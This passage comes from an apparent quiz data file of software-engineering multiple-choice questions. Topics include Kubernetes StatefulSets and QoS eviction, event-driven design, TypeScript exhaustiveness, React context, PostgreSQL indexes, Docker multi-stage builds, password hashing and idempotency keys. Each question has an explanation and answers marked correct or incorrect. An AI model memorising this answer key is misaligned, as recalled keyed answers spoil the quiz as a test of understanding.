1. **Stable pod names**: pods are named \`<statefulset>-0\`, \`<statefulset>-1\`, etc. and are recreated with the same name after restarts. Combined with a Headless Service, each pod gets a DNS entry like \`mongo-0.mongo.default.svc.cluster.local\`. MongoDB replica set configuration requires knowing each member's address in advance — these stable names make that possible.

2. **Per-pod PersistentVolumeClaims**: the \`volumeClaimTemplates\` field creates a separate PVC for each pod (\`data-mongo-0\`, \`data-mongo-1\`, etc.). When \`mongo-0\` is rescheduled to a different node, it reattaches to its original PVC and retains all data.

**Why a Deployment fails here:**
- Deployment pods are **stateless and interchangeable** — they share no stable identity. Pod names include random suffixes (\`mongo-abc12\`) and change on restart.
- All replicas in a Deployment share a single PVC if one is mounted, or each gets a new anonymous PVC on reschedule (losing data).
- There's no guaranteed ordering for startup/shutdown — MongoDB replica set initialization requires sequential, ordered startup.

StatefulSets also provide ordered rolling updates and graceful ordered termination, both important for maintaining replica set quorum during upgrades.`,
        answers: [
          {
            answer: "Use a **StatefulSet**. It provides stable pod names (`mongo-0`, `mongo-1`, `mongo-2`), per-pod PVCs via `volumeClaimTemplates`, and ordered startup/shutdown. A Deployment's pods are anonymous and interchangeable — they have no stable identity and share or lose storage on reschedule.",
            isCorrect: true,
          },
          {
            answer: "Use a **Deployment** with a `ReadWriteMany` PVC shared across all replicas — MongoDB handles data distribution internally so dedicated volumes are unnecessary.",
            isCorrect: false,
          },
          {
            answer: "Use a **DaemonSet** — it ensures exactly one MongoDB pod per node, providing the physical isolation and stable node-based addressing the replica set needs.",
            isCorrect: false,
          },
          {
            answer: "Use a **Deployment** with pod affinity rules and `nodeSelector` labels — this pins each pod to a specific node, simulating stable identity without the overhead of a StatefulSet.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `An e-commerce platform uses synchronous REST calls: when an order is placed, the Order Service calls the Inventory Service, Payment Service, and Notification Service **in sequence** before responding to the client. The Notification Service goes down, causing all order placements to fail.

A solutions architect proposes migrating to an **event-driven architecture** using a message broker. What is the primary benefit, and what new operational complexity does it introduce?`,
        explanation: `**Primary benefit: loose coupling and resilience.**

In an event-driven architecture, the Order Service publishes an \`OrderPlaced\` event to a message broker (Kafka, SQS, RabbitMQ) and immediately returns a success response. The Inventory, Payment, and Notification services each subscribe to and process the event independently. The Notification Service being down no longer blocks order placement — it simply falls behind in consuming events and catches up when it recovers. No service is directly dependent on another's availability.

Additional benefits: services can scale independently, teams can deploy them without coordinating releases, and new consumers (e.g., an analytics service) can subscribe without changing the producer.

**New operational complexity:**

1. **Eventual consistency**: the response to the client confirms the *event was accepted*, not that payment was charged or inventory was reserved. The system is eventually consistent — the UI must handle in-progress states gracefully.

2. **Distributed tracing and observability**: a single business transaction (place order → charge payment → reserve inventory → notify) is now spread across multiple async hops. End-to-end tracing (OpenTelemetry correlation IDs) becomes essential.

3. **Failure handling**: failed event processing must be handled via dead-letter queues, retry policies, and idempotency (the same event may be delivered more than once).

4. **Ordering guarantees**: some workflows require events to be processed in order — this requires careful partitioning strategy on brokers like Kafka.`,
        answers: [
          {
            answer: "Primary benefit: loose coupling — the Order Service publishes an event and returns immediately; downstream services fail or lag independently without blocking orders. New complexity: eventual consistency, distributed tracing, idempotent consumers, and dead-letter queue management.",
            isCorrect: true,
          },
          {
            answer: "Primary benefit: lower latency — async messaging is always faster than synchronous HTTP. New complexity: increased memory usage on the broker as events accumulate.",
            isCorrect: false,
          },
          {
            answer: "Primary benefit: data normalization — events carry the full entity state, eliminating the need for each service to maintain its own database. New complexity: events become the source of truth and must be versioned carefully.",
            isCorrect: false,
          },
          {
            answer: "Primary benefit: automatic error handling — the message broker retries failed deliveries indefinitely, so application-level error handling is no longer needed. New complexity: configuring the broker's retry backoff.",
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "Quiz 3",
    questions: [
      {
        question: `The following TypeScript function uses an exhaustiveness check. A new \`"triangle"\` variant is added to the \`Shape\` union but \`area\` is not updated. What happens, and what is the role of the \`never\` type here?

\`\`\`typescript
type Shape =
  | { kind: "circle"; radius: number }
  | { kind: "square"; side: number };

function area(shape: Shape): number {
  switch (shape.kind) {
    case "circle": return Math.PI * shape.radius ** 2;
    case "square": return shape.side ** 2;
    default: {
      const _exhaustive: never = shape;
      return _exhaustive;
    }
  }
}
\`\`\``,
        explanation: `This is the **exhaustiveness checking** pattern built on the fact that \`never\` is the empty type — no value is assignable to \`never\` except a value of type \`never\` itself.

Inside the \`default\` branch, TypeScript has narrowed \`shape\` by eliminating every handled \`kind\`. As long as all variants are handled, the narrowed type is \`never\`, and \`const _exhaustive: never = shape\` type-checks.

The moment you add \`{ kind: "triangle"; base: number; height: number }\` to \`Shape\` without adding a \`case\`, the \`default\` branch narrows \`shape\` to that triangle member instead of \`never\`. Assigning it to a \`never\`-typed variable produces a **compile-time error**: \`Type '{ kind: "triangle"; ... }' is not assignable to type 'never'\`. This turns a forgotten case into a build failure rather than a silent runtime bug.

Note this is a *compile-time* guarantee only — it requires strict type checking and provides no protection if \`shape\` arrives as untyped data at runtime (e.g., from JSON). For that you still need runtime validation.`,
        answers: [
          {
            answer: "TypeScript raises a compile-time error at the `never` assignment because the un-handled `triangle` variant is no longer narrowable to `never`, catching the missing case at build time.",
            isCorrect: true,
          },
          {
            answer: "Nothing changes at compile time; the `default` branch silently returns `undefined` at runtime for triangles.",
            isCorrect: false,
          },
          {
            answer: "TypeScript throws a runtime `TypeError` whenever a triangle is passed, because `never` values cannot be constructed.",
            isCorrect: false,
          },
          {
            answer: "The code fails to compile immediately even before adding `triangle`, because assigning any value to `never` is always illegal.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does the following JavaScript code log, and why?

\`\`\`javascript
const user = {
  name: "Ada",
  greetLater() {
    setTimeout(function () {
      console.log("Hi, " + this.name);
    }, 0);
  },
  greetLaterArrow() {
    setTimeout(() => {
      console.log("Hi, " + this.name);
    }, 0);
  },
};

user.greetLater();
user.greetLaterArrow();
\`\`\``,
        explanation: `The output is:
\`\`\`
Hi, undefined
Hi, Ada
\`\`\`

**\`greetLater\`** passes a regular \`function\` to \`setTimeout\`. Regular functions get their \`this\` bound **at call time** based on *how* they are invoked. \`setTimeout\` invokes its callback as a plain function call with no receiver, so \`this\` is the global object (\`window\` in browsers, \`global\`/\`timers\` object in Node) in non-strict mode, or \`undefined\` in strict mode / ES modules. Either way \`this.name\` is not \`"Ada"\` — in a browser it logs \`Hi, undefined\`.

**\`greetLaterArrow\`** uses an **arrow function**, which has no \`this\` of its own. It lexically captures \`this\` from the enclosing scope — the \`greetLaterArrow\` method, where \`this\` is \`user\`. So \`this.name\` is \`"Ada"\`.

This is the single most important practical difference between arrow functions and regular functions: arrow functions capture \`this\` lexically and cannot be re-bound with \`call\`/\`apply\`/\`bind\`. It's exactly why arrow functions became the default for callbacks, event handlers, and array-method iteratees that need to reference enclosing state.`,
        answers: [
          {
            answer: "`Hi, undefined` then `Hi, Ada` — the regular function's `this` is rebound by `setTimeout` (not `user`), while the arrow function lexically captures `this` from the enclosing method.",
            isCorrect: true,
          },
          {
            answer: "`Hi, Ada` then `Hi, Ada` — both callbacks retain `this` from the object they were defined on.",
            isCorrect: false,
          },
          {
            answer: "`Hi, Ada` then `Hi, undefined` — regular functions capture `this` lexically while arrow functions get a fresh global `this`.",
            isCorrect: false,
          },
          {
            answer: "`Hi, undefined` then `Hi, undefined` — `setTimeout` always strips `this` for every callback type.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Node.js endpoint streams a 2 GB file to an HTTP client. Version A buffers the whole file; version B pipes it. Why does version B use dramatically less memory, and what does \`pipe\` do about a slow client?

\`\`\`javascript
// Version A
app.get("/download", async (req, res) => {
  const data = await fs.promises.readFile("/data/huge.bin");
  res.end(data);
});

// Version B
app.get("/download", (req, res) => {
  fs.createReadStream("/data/huge.bin").pipe(res);
});
\`\`\``,
        explanation: `**Version A** calls \`fs.promises.readFile\`, which reads the *entire* 2 GB into a single \`Buffer\` in memory before sending anything. With even a handful of concurrent downloads the process balloons past its heap/RSS limits and can crash with an out-of-memory error. It also delays the first byte until the whole file is read.

**Version B** uses a **readable stream** piped to the response. The file is read in small chunks (default 64 KB \`highWaterMark\`), each chunk is written to the socket, and then the next chunk is read. Peak memory is a few buffers, not the whole file — roughly constant regardless of file size. Data also starts flowing to the client immediately.

Crucially, \`pipe\` also handles **backpressure** automatically. If the client (or network) is slow, \`res.write()\` returns \`false\` when the socket's internal buffer fills. \`pipe\` responds by calling \`.pause()\` on the read stream, stops pulling from disk, and resumes (\`.resume()\`) only when the \`drain\` event fires. This prevents a fast disk from overwhelming a slow consumer and keeps memory bounded. Manually re-implementing this correctly is error-prone, which is why \`pipe\` (or \`stream.pipeline\`, which also propagates errors and cleans up) is strongly preferred.`,
        answers: [
          {
            answer: "Streaming reads the file in small chunks so peak memory stays roughly constant instead of holding all 2 GB, and `pipe` applies backpressure — pausing the read stream when the client's socket buffer is full and resuming on `drain`.",
            isCorrect: true,
          },
          {
            answer: "`pipe` compresses the file on the fly, so less data is held in memory; slow clients are handled by dropping chunks that can't be sent in time.",
            isCorrect: false,
          },
          {
            answer: "Both versions use the same memory, but `pipe` runs on a libuv worker thread so it doesn't block the event loop; backpressure is irrelevant for HTTP.",
            isCorrect: false,
          },
          {
            answer: "Streaming loads the whole file once too, but caches it on disk; a slow client causes `pipe` to buffer everything in memory until the client catches up.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `In React, every consumer of this Context re-renders on each keystroke in an unrelated input, causing lag. What is the root cause, and what is a standard fix?

\`\`\`tsx
function AppProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = React.useState<User | null>(null);
  const [theme, setTheme] = React.useState<"light" | "dark">("light");

  return (
    <AppContext.Provider value={{ user, setUser, theme, setTheme }}>
      {children}
    </AppContext.Provider>
  );
}
\`\`\``,
        explanation: `Two things combine to cause the problem:

1. **A new \`value\` object every render.** The object literal \`{ user, setUser, theme, setTheme }\` is a fresh reference on every render of \`AppProvider\`. React Context compares the provider's \`value\` by reference (\`Object.is\`); a new object means every consumer is notified of a "change."

2. **All consumers of a single context re-render together.** Context has no partial-subscription mechanism. A component that only reads \`theme\` still re-renders whenever \`user\` (or anything else in the value) changes, because it subscribes to the whole context value.

So when unrelated state elsewhere triggers a provider re-render, the new \`value\` object propagates to *every* consumer.

**Standard fixes:**
- **Split contexts**: put \`user\` and \`theme\` in separate providers so consumers subscribe only to what they use. This is the most idiomatic fix.
- **Memoize the value**: \`const value = useMemo(() => ({ user, setUser, theme, setTheme }), [user, theme])\` gives a stable reference so consumers re-render only when \`user\` or \`theme\` actually change — not on unrelated parent re-renders.
- **Separate state from dispatch**: a common pattern is one context for state and another for the stable \`dispatch\`/setters, so components that only dispatch never re-render on state changes.
- For fine-grained subscriptions at scale, an external store (Zustand, Redux with selectors, or \`useSyncExternalStore\`) lets components subscribe to slices.`,
        answers: [
          {
            answer: "The provider's `value` is a new object literal every render and all consumers of a context re-render together. Fix by splitting into separate contexts and/or memoizing the value with `useMemo` so it changes only when `user`/`theme` actually change.",
            isCorrect: true,
          },
          {
            answer: "Context always re-renders every component in the tree; the only fix is to stop using Context and lift all state into a Redux store.",
            isCorrect: false,
          },
          {
            answer: "The `useState` setters (`setUser`, `setTheme`) are recreated each render, so consumers must wrap them in `useCallback` — that alone eliminates the re-renders.",
            isCorrect: false,
          },
          {
            answer: "React re-renders consumers because the provider is missing a `key` prop; adding a stable `key` to `AppContext.Provider` prevents the cascade.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `This query is slow on a 50-million-row \`orders\` table. \`EXPLAIN ANALYZE\` shows a **Seq Scan**. There is already a B-tree index on \`(customer_id)\`. Why isn't it used efficiently, and what index would make this query an index-only scan?

\`\`\`sql
SELECT customer_id, status, total
FROM orders
WHERE customer_id = 12345 AND status = 'shipped';
\`\`\``,
        explanation: `Two things are happening.

First, a single-column index on \`(customer_id)\` *can* be used to find rows for customer \`12345\`, but if that customer has many orders the planner must then fetch each matching heap row to check \`status = 'shipped'\` and to read \`total\`. When the estimated number of matching rows is large relative to the table, the planner may decide a **sequential scan** is cheaper than many random heap lookups — which is what \`EXPLAIN\` is showing.

The fix is a **composite index** that matches both the filter and the returned columns:

\`\`\`sql
CREATE INDEX idx_orders_cust_status_total
ON orders (customer_id, status) INCLUDE (total);
\`\`\`

- \`(customer_id, status)\` lets the index seek directly to rows matching *both* predicates — column order matters: the equality columns come first.
- The \`INCLUDE (total)\` clause stores \`total\` in the index leaf pages (a **covering index**). Now every column the query needs — \`customer_id\`, \`status\`, \`total\` — is available from the index alone.

Because all needed columns live in the index, PostgreSQL can perform an **index-only scan**, skipping heap access entirely (given the visibility map is up to date via \`VACUUM\`). This turns a 50-million-row seq scan into a narrow index seek.

Rule of thumb for composite indexes: **equality columns first, then range columns, then included/covering columns.**`,
        answers: [
          {
            answer: "The single-column index doesn't cover `status` or `total`, so matching many rows leads the planner to a seq scan. A composite covering index `(customer_id, status) INCLUDE (total)` enables an index-only scan with no heap access.",
            isCorrect: true,
          },
          {
            answer: "PostgreSQL never uses B-tree indexes for `AND` conditions on two columns; you must create a separate index on `status` and let the planner do a bitmap `AND`.",
            isCorrect: false,
          },
          {
            answer: "The index is unused because `customer_id` is an integer; indexes only accelerate string columns, so casting `customer_id` to text would fix it.",
            isCorrect: false,
          },
          {
            answer: "Sequential scans are always faster than index scans on large tables, so the query is already optimal and no index change will help.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `The final production image built from this Dockerfile is 1.1 GB and contains the full TypeScript toolchain, dev dependencies, and source \`.ts\` files. What technique reduces it to a lean runtime image, and roughly what should the production stage contain?

\`\`\`dockerfile
FROM node:22
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build          # tsc -> dist/
CMD ["node", "dist/index.js"]
\`\`\``,
        explanation: `The problem: a single-stage build ships **everything** used to *build* the app in the image that *runs* it — the full \`node:22\` image (~1 GB), all \`devDependencies\` (TypeScript, type definitions, test tooling), and the original \`.ts\` source. None of that is needed at runtime; only the compiled \`dist/\` and production \`node_modules\` are.

The technique is a **multi-stage build**. Use a \`build\` stage with the full toolchain to compile, then a separate slim \`runtime\` stage that copies *only* the compiled output and production dependencies:

\`\`\`dockerfile
# ---- build stage ----
FROM node:22 AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# ---- runtime stage ----
FROM node:22-alpine AS runtime
WORKDIR /app
ENV NODE_ENV=production
COPY package*.json ./
RUN npm ci --omit=dev          # production deps only
COPY --from=build /app/dist ./dist
CMD ["node", "dist/index.js"]
\`\`\`

Key points:
- The final image is based on a **smaller runtime base** (\`node:22-alpine\`, or even a distroless image) and never contains TypeScript, dev dependencies, or source \`.ts\` files.
- \`COPY --from=build\` pulls only the artifacts you name across the stage boundary; the entire build stage (and its bloat) is discarded.
- \`npm ci --omit=dev\` (or copying a pruned \`node_modules\`) keeps only production dependencies.

This typically cuts a Node/TypeScript image from ~1 GB to ~150–200 MB, reducing pull time, attack surface, and cost.`,
        answers: [
          {
            answer: "Use a multi-stage build: compile in a full-toolchain `build` stage, then `COPY --from=build` only `dist/` into a slim runtime stage (e.g. `node:22-alpine`) that installs production-only deps with `npm ci --omit=dev`.",
            isCorrect: true,
          },
          {
            answer: "Add `RUN npm prune --production` as the last line; this rewrites the earlier layers in place and removes the base image bloat and source files.",
            isCorrect: false,
          },
          {
            answer: "Set `.dockerignore` to exclude `node_modules`; this alone shrinks the final image to a lean runtime because dependencies are then downloaded at container start.",
            isCorrect: false,
          },
          {
            answer: "Switch the single `FROM node:22` to `FROM node:22-slim` — the toolchain and dev dependencies are automatically stripped from slim images at build time.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Kubernetes cluster is under memory pressure and the kubelet must evict pods. Three pods run on the node with these resource specs. Which pod is evicted **first**, and what QoS classes do these specs produce?

\`\`\`yaml
# Pod A
resources:
  requests: { cpu: "250m", memory: "256Mi" }
  limits:   { cpu: "250m", memory: "256Mi" }

# Pod B
resources:
  requests: { cpu: "250m", memory: "256Mi" }
  limits:   { cpu: "500m", memory: "512Mi" }

# Pod C
# (no resources block at all)
\`\`\``,
        explanation: `Kubernetes assigns each pod a **Quality of Service (QoS) class** based on its requests and limits, and uses that class to decide eviction order under node pressure:

- **Pod A → \`Guaranteed\`**: every container sets \`requests == limits\` for *both* CPU and memory. These pods are the last to be evicted.
- **Pod B → \`Burstable\`**: it sets requests, but limits differ from requests (or not all resources are constrained). Evicted after \`BestEffort\` but before \`Guaranteed\`.
- **Pod C → \`BestEffort\`**: no requests or limits at all. These are the **first evicted** under resource pressure.

So **Pod C is evicted first.** Under memory pressure the kubelet ranks candidates by QoS class (\`BestEffort\` → \`Burstable\` → \`Guaranteed\`) and, within a class, by how much a pod exceeds its memory request. \`BestEffort\` pods have no memory request, so they're the top eviction candidates.

Practical guidance: set requests and limits deliberately. \`Guaranteed\` pods get the strongest protection and predictable performance; \`BestEffort\` pods are cheap to schedule but the first sacrificed. For critical workloads, set \`requests == limits\` to land in \`Guaranteed\`. Note also that exceeding a *memory limit* gets a container OOM-killed regardless of QoS — QoS governs *eviction under node pressure*, which is a separate mechanism.`,
        answers: [
          {
            answer: "Pod C is evicted first. Pod A is `Guaranteed` (requests == limits for CPU and memory), Pod B is `Burstable` (requests set, limits differ), and Pod C is `BestEffort` (no requests/limits) — evicted first under node memory pressure.",
            isCorrect: true,
          },
          {
            answer: "Pod A is evicted first because its tight `limits` leave no headroom; Pods B and C are `Burstable` and can grow, so the scheduler protects them.",
            isCorrect: false,
          },
          {
            answer: "Pod B is evicted first because a mismatch between requests and limits makes it `BestEffort`; A and C are both `Guaranteed`.",
            isCorrect: false,
          },
          {
            answer: "Eviction order is random across all three — Kubernetes does not use resource specs to prioritize evictions, only pod age.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Node.js API stores user passwords by hashing them with SHA-256 before saving to the database. A security reviewer flags this as insecure even though SHA-256 is cryptographically strong. Why is SHA-256 the wrong tool for password storage, and what should be used instead?`,
        explanation: `SHA-256 is a **fast, general-purpose cryptographic hash** — and *fast* is exactly the problem for password storage. Two weaknesses make raw SHA-256 unsuitable:

1. **Speed enables brute force.** Modern GPUs and ASICs compute *billions* of SHA-256 hashes per second. If a database leaks, an attacker can try enormous numbers of candidate passwords per second against each hash. Fast hashing is a feature for integrity/signatures but a liability for passwords.

2. **No built-in salt → rainbow tables and shared hashes.** Without a per-user salt, identical passwords produce identical hashes, so an attacker sees which users share a password and can use precomputed **rainbow tables** to reverse common passwords instantly.

The correct tool is a **slow, salted, adaptive password-hashing function** designed specifically for this purpose:
- **bcrypt** — battle-tested, includes a per-hash salt automatically, with a tunable **work factor** (cost) you raise as hardware improves.
- **scrypt** and **Argon2** (Argon2id is the current recommendation, PHC winner) — additionally **memory-hard**, defeating GPU/ASIC parallelism by requiring large amounts of RAM per guess.

Example with bcrypt:
\`\`\`javascript
import bcrypt from "bcrypt";
const hash = await bcrypt.hash(password, 12); // cost factor 12
const ok   = await bcrypt.compare(password, hash);
\`\`\`

The deliberate slowness (tens of milliseconds per hash) is negligible for a single legitimate login but makes large-scale offline cracking economically infeasible. The salt is generated and stored inside the bcrypt output automatically, so identical passwords yield different hashes.`,
        answers: [
          {
            answer: "SHA-256 is designed to be fast and is unsalted, so a leaked database can be brute-forced at billions of guesses per second and is vulnerable to rainbow tables. Use a slow, salted, adaptive hash like bcrypt, scrypt, or Argon2id instead.",
            isCorrect: true,
          },
          {
            answer: "SHA-256 is reversible if you know the input length, so attackers can decrypt the passwords directly. Use AES-256 encryption for passwords instead.",
            isCorrect: false,
          },
          {
            answer: "SHA-256 produces only 256 bits of output, which is too short to be secure for passwords. Use SHA-512 to double the hash length and fix the vulnerability.",
            isCorrect: false,
          },
          {
            answer: "SHA-256 is fine as long as you hash the password twice (SHA-256 of the SHA-256); double hashing adds the needed slowness and salting automatically.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A payment API endpoint is called by a mobile client. On flaky networks the client retries requests that time out, occasionally charging the same customer twice. The team wants to guarantee that retrying a request never causes a duplicate charge. What is the standard technique, and how does it work?`,
        explanation: `The technique is an **idempotency key** (idempotent request pattern), used by Stripe, PayPal, and most robust payment APIs.

**How it works:**
1. The client generates a unique key (typically a UUID) for each *logical* operation — e.g., "charge \$50 for order #123" — and sends it in a header: \`Idempotency-Key: 9f8b...\`. Critically, **retries of the same operation reuse the same key**.
2. On the server, before performing the charge, it checks a store (often Redis or a dedicated table) for that key:
   - **Key not seen** → process the charge, then store the key together with the response (status + body) atomically.
   - **Key already seen and completed** → skip the charge entirely and return the *stored* original response.
   - **Key seen but still in progress** → return a "request in progress" / conflict response (or wait), so two concurrent retries don't both execute.
3. Keys are given a TTL (e.g., 24 hours) since retries happen within a short window.

The result: no matter how many times the client retries after a timeout, the charge executes **at most once**, and every retry returns the same response as the original. This safely turns an unreliable, at-least-once delivery channel into effectively exactly-once *semantics* for the side effect.

Important nuances: the check-and-store must be **atomic** (e.g., an \`INSERT ... ON CONFLICT\` or a Redis \`SET NX\`) to handle concurrent retries; and the key must key on the *operation*, not be regenerated per HTTP attempt — otherwise retries look like new requests.`,
        answers: [
          {
            answer: "Use an idempotency key: the client sends a unique key per logical operation (reused on retries); the server atomically records it, performs the charge only the first time it sees the key, and returns the stored original response for any retry.",
            isCorrect: true,
          },
          {
            answer: "Switch the endpoint from POST to PUT — PUT is idempotent by definition in HTTP, so the network layer automatically prevents the server from processing a retried charge twice.",
            isCorrect: false,
          },
          {
            answer: "Increase the client's request timeout so retries never fire; if the client never retries, duplicate charges cannot happen and no server-side changes are needed.",
            isCorrect: false,
          },
          {
            answer: "Wrap the charge in a database transaction with `SERIALIZABLE` isolation; transaction isolation guarantees that two separate HTTP requests for the same charge are collapsed into one.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `This code models a coffee order using deep inheritance. Adding "iced" and "extra shot" as new inheritable options is causing a class explosion (\`IcedLatteWithExtraShot\`, \`IcedMochaWithSoy\`, …). Which design approach solves this, and what principle does it embody?

\`\`\`typescript
class Coffee { cost() { return 2.0; } }
class Latte extends Coffee { cost() { return super.cost() + 0.5; } }
class LatteWithSoy extends Latte { cost() { return super.cost() + 0.4; } }
class LatteWithSoyAndExtraShot extends LatteWithSoy {
  cost() { return super.cost() + 0.6; }
}
\`\`\``,
        explanation: `The inheritance tree combinatorially explodes: every combination of add-ons (soy, extra shot, iced, mocha…) needs its own subclass. This is the textbook motivation for the **Decorator pattern**, an application of **composition over inheritance**.

Instead of subclassing, wrap a base object in decorator objects that share the same interface and each add one piece of behavior:

\`\`\`typescript
interface Beverage { cost(): number; description(): string; }

class Coffee implements Beverage {
  cost() { return 2.0; }
  description() { return "Coffee"; }
}

abstract class AddOn implements Beverage {
  constructor(protected inner: Beverage) {}
  abstract cost(): number;
  abstract description(): string;
}

class Soy extends AddOn {
  cost() { return this.inner.cost() + 0.4; }
  description() { return this.inner.description() + " + Soy"; }
}
class ExtraShot extends AddOn {
  cost() { return this.inner.cost() + 0.6; }
  description() { return this.inner.description() + " + Extra Shot"; }
}

// Compose at runtime, in any combination, with no new classes:
const order = new ExtraShot(new Soy(new Coffee()));
order.cost();        // 3.0
order.description(); // "Coffee + Soy + Extra Shot"
\`\`\`

Now *N* add-ons require *N* decorator classes, and they combine freely at runtime instead of requiring a class per combination (which would be 2^N). This embodies **"favor composition over inheritance"** and the **Open/Closed Principle** — you extend behavior by adding new decorators without modifying existing classes. Java's \`java.io\` streams (\`BufferedInputStream(new FileInputStream(...))\`) are a canonical real-world example.`,
        answers: [
          {
            answer: "Use the Decorator pattern — wrap a base `Beverage` in add-on decorators that share its interface and each add one cost/behavior. It embodies composition over inheritance (and the Open/Closed Principle), so N add-ons combine freely instead of needing a subclass per combination.",
            isCorrect: true,
          },
          {
            answer: "Use the Singleton pattern so only one `Coffee` instance exists; shared mutable add-on flags on that instance eliminate the need for subclasses.",
            isCorrect: false,
          },
          {
            answer: "Deepen the inheritance hierarchy further and mark intermediate classes `abstract`; abstract base classes automatically collapse combinatorial subclasses.",
            isCorrect: false,
          },
          {
            answer: "Switch every add-on to a static utility function that mutates a global order object; global mutation is the standard fix for class explosion.",
            isCorrect: false,
          },
        ],
      },
    ],
  },
];
